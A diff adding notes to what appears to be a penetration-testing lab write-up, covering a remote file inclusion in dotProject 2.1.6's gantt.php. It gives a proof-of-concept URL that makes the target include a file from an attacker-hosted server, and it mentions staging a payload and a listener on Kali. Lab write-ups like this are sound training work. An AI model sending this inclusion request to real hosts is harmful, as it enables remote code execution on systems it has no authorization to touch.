@@ -192,6 +192,27 @@ find / -name "proof.txt" 2>/dev/null
 
 **Exploit search (narrowed):** `searchsploit dotproject 2.1.6` then **`searchsploit -x`** on hits that list **2.1.6** (e.g. **baseDir RFI** class for that line). Re-check **`/dotproject/install/`** behavior only in a way your lab allows (some installs leave risky endpoints).
 
+### Exploit lead — dotProject **≤ 2.1.6** RFI (`gantt.php` + `dPconfig[root_dir]`)
+
+![searchsploit -x — dotProject 2.1.6 RFI, gantt.php, dPconfig root_dir](../Screenshots/searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png)
+
+| Field | Value |
+|-------|--------|
+| **Issue** | **Remote file inclusion** via **`$dPconfig['root_dir']`** used in **`include (...)`** in **`modules/projectdesigner/gantt.php`** (advisory snippet: line with **`jpgraph.php`** include). |
+| **PoC shape** | `http://<target>/dotproject/modules/projectdesigner/gantt.php?dPconfig[root_dir]=http://<your-host>/info.txt?` |
+| **PHP prerequisites** | **`register_globals = On`** (attacker supplies **`dPconfig`** via request) and **`allow_url_include = On`** (remote **`http://`** include). Many hardened hosts disable these; **PHP 5.3.x lab stacks** sometimes still match. |
+| **Why it fits `.102`** | Fingerprinted **dotProject 2.1.6** — in the affected range. |
+
+**Safe validation (recon-only):**
+
+```bash
+# Script present?
+curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
+# Optional: grep phpinfo / error pages elsewhere for register_globals / allow_url_include (if allowed)
+```
+
+**If prerequisites likely and lab authorizes:** host a minimal **`info.txt`** (or staged payload per course rules) on **Kali**, replace **`<your-host>`** with **Kali IP**, watch **Apache/PHP** response and listener behavior — **read full `searchsploit -x`** for exact encoding and follow-on.
+
 ### Recon — `curl /cgi-bin` (404; headers + error body)
 
 ![curl -sik http://RHOST_102/cgi-bin — 404, Server banner](../Screenshots/recon_curl_cgi-bin_404_headers_tm6_afrocha.png)
